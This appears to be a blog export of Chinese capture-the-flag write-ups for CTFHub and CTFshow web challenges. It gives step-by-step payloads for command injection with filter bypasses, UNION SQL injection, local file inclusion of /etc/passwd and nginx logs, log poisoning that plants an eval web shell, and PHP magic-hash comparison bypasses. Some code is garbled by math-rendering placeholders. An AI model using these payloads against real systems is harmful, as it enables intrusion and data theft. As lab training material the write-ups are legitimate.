<p><img src="https://img-blog.csdnimg.cn/20210531204104432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就把flag文本文件展现了出来，那就cat 文本内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cat flag_14322672312813.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210531204314488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>哇哦，flag呢😡😡😡😡不要急，这次我们不用base64对内容加密获取了,我们来看看文件的源码，看看藏在哪<img src="https://img-blog.csdnimg.cn/20210531204454691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这不是出来了<br>由于对<code>|</code>进行过滤了，直接对管道进行base64加密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;base64 flag_14322672312813.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021053120532313.png" alt="在这里插入图片描述"><br>进行解密<img src="https://img-blog.csdnimg.cn/20210531205452687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><p>对于过滤情况的题，我发现了一个宝藏！！！<br><strong>url补充表</strong><br><img src="https://img-blog.csdnimg.cn/2021060119342447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210601193431757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>接下来我们来进行解题吧<img src="https://img-blog.csdnimg.cn/20210601193739236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到本题过滤了：<code>/ \ &amp; ; cat flag ctfhub</code>这些运算符<br>在本题中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、使用%<span class="hljs-number">0</span>a代替换行符<br><span class="hljs-number">2</span>、使用%<span class="hljs-number">09</span>a替代TABJ补充被过滤的flag<br><span class="hljs-number">3</span>、%<span class="hljs-number">5</span>c 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了）<br></code></pre></td></tr></table></figure>
<p>检索目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210601195338456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>进入到FLAG文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210601200159778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">这里%<span class="hljs-number">09</span>用于补充被过滤掉的flag<br></code></pre></td></tr></table></figure>
<p>接下看我们查看flag_324582491729512.php的内容信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>aca%<span class="hljs-number">5</span>ct%<span class="hljs-number">09</span>*_324582491729512.php<br>在这里因为cat被过滤了因此需要%<span class="hljs-number">5</span>c将cat分隔开绕过过滤<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210601195957232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码</p>
<p><img src="https://img-blog.csdnimg.cn/20210601200740771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者直接对管道进行base64加密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>abase64%<span class="hljs-number">09</span>*_324582491729512.php<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210601201013998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密<img src="https://img-blog.csdnimg.cn/20210601201052437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>CTFshow(web2-4）</title>
    <url>/2021/06/05/CTFshow(web2-4%EF%BC%89/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h1><p><img src="https://img-blog.csdnimg.cn/20210529112350544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210529112403564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入可以看到表单,很明显这是POST注入，可以利用万能密码进行登录</p>
<p>测试：<br><img src="https://img-blog.csdnimg.cn/20210529112603193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆成功</p>
<p>回显查看<br><code>1&#39; or 1=1 union select 1,2,3#</code><br><img src="https://img-blog.csdnimg.cn/20210529112757746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行数据库的查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 union select 1,database(),3#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210529112920428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;</span>web2<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210529113138730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210529113331574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询字段内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,flag,3 from flag#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021052911343287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="web03"><a href="#web03" class="headerlink" title="web03"></a>web03</h1><p><img src="https://img-blog.csdnimg.cn/2021052911423421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示，这是存在文件包含漏洞，提示<code>url</code> 进行测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210529114421346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见存在文件包含漏洞<br>本题可以是使用PHP伪协议+文件包含，实现任意命令执行<br><strong>方法一</strong>：<br>php伪协议中的data通过通配符查找目录下的所有文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span>data:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>text<span class="hljs-operator">/</span>plain,<span class="hljs-operator">&lt;</span>?php print_r(glob(&quot;*&quot;)); ?<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210529114914757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到ctf_go_go_go的文件进行访问<img src="https://img-blog.csdnimg.cn/20210529115004829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021052912011174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现一个常见的php伪协议及用法表，贴出来<img src="https://img-blog.csdnimg.cn/20210529120428427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="web04-日志注入"><a href="#web04-日志注入" class="headerlink" title="web04(日志注入)"></a>web04(日志注入)</h1><p><img src="https://img-blog.csdnimg.cn/20210530192254801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以见到本题与上一题相似，虽然过滤了php，但可能存在文件包含漏洞，进行测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210530192501916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看日志信息，发现服务器是nginx；<img src="https://img-blog.csdnimg.cn/20210530192800148.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210530192829313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在日志包含中，找到nginx的log有两种：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>nginx<span class="hljs-operator">/</span>access.log<br><span class="hljs-number">2</span>、?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>nginx<span class="hljs-operator">/</span>error.log<br></code></pre></td></tr></table></figure>
<p>这里：?url=/var/log/nginx/access.log可以打开<br><img src="https://img-blog.csdnimg.cn/20210530193101859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210530193133477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进行日志注入</strong><br>为了防止url编码，需要在burp中修改<code>User-Agent</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[<span class="hljs-string">&#x27;2&#x27;</span>]);?<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210530193704899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用蚁剑进行连接</p>
<p><img src="https://img-blog.csdnimg.cn/20210530193932469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功后打开目录<br><img src="https://img-blog.csdnimg.cn/20210530194007998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/20210530194039228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>CTFshow-web(5-6)</title>
    <url>/2021/06/05/CTFshow-web(5-6)/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h1 id="一、web05"><a href="#一、web05" class="headerlink" title="一、web05"></a>一、web05</h1><p><img src="https://img-blog.csdnimg.cn/20210530195549600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>    <br><span class="hljs-meta">?&gt;</span><br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br><br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot;</span> /&gt;<br>    &lt;title&gt;ctf.show_web5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;center&gt;<br>    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;<br>    &lt;hr&gt;<br>    &lt;h3&gt;<br>    &lt;/center&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        MATHJAX-SSR<span class="hljs-number">-0</span>_GET[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        MATHJAX-SSR<span class="hljs-number">-1</span>_GET[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(MATHJAX-SSR<span class="hljs-number">-2</span>v2))&#123;<br>            <span class="hljs-keyword">if</span>(!ctype_alpha(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(md5(MATHJAX-SSR<span class="hljs-number">-3</span>v2))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(md5(MATHJAX-SSR<span class="hljs-number">-4</span>v2))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure>
<p>对代码进行解读，可以看到<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.29ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 6583.2 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v1为字符形式，</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-31" x="485" y="0"></use>
<g transform="translate(986,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">为</text>
</g>
<g transform="translate(1918,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">字</text>
</g>
<g transform="translate(2851,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">符</text>
</g>
<g transform="translate(3784,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">形</text>
</g>
<g transform="translate(4717,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">式</text>
</g>
<g transform="translate(5650,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">，</text>
</g>
</g>
</svg>v2为数字形式，并且二者的值必须相等<br>在这里涉及到了一个知识：==MD5 compare漏洞==看一下这是什么</p>
<ul>
<li>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</li>
</ul>
<p>参考常见的payload有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">0x01</span> md5(str)<br>    QNKCDZO<br>    <span class="hljs-number">240610708</span><br>    s878926199a<br>    s155964671a<br>    s214587387a<br>    s214587387a<br>     sha1(str)<br>    sha1(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)  <br>    sha1(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)<br>    sha1(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)<br>    sha1(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)<br><br><span class="hljs-number">0x02</span> md5(md5(str).<span class="hljs-string">&quot;SALT&quot;</span>)<br>    <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p> 构造本题的payload: <code>?v1=QNKCDZO&amp;v2=240610708</code><br> <img src="https://img-blog.csdnimg.cn/20210530200616904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知识点参考<a href="https://blog.csdn.net/qq_31481187/article/details/60968595">PHP 函数漏洞总结</a></p>
<h1 id="二、web06"><a href="#二、web06" class="headerlink" title="二、web06"></a>二、web06</h1><p><img src="https://img-blog.csdnimg.cn/20210530201456544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是不是很相似呢，是的!本题与第二关是相同的类型，考察的都是<strong>POST注入</strong> 只不过在本关存在过滤<img src="https://img-blog.csdnimg.cn/20210530201725887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试发现该关是将空格符号过滤掉了🤬🤬在本关可以使用<code>/**/对空格进行代替</code></p>
<p>其他均与第二关相似<br>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="hljs-string">2、1&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">#</span><br><span class="hljs-number">3</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,table_name,3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;</span>web2<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">4、1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-comment">#</span><br><span class="hljs-number">5</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></code></pre></td></tr></table></figure>
<p><strong>回显</strong><br><img src="https://img-blog.csdnimg.cn/20210530202329645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>表名</strong><br><img src="https://img-blog.csdnimg.cn/20210530202343902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>列名</strong><br><img src="https://img-blog.csdnimg.cn/20210530202400365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>字段</strong><br><img 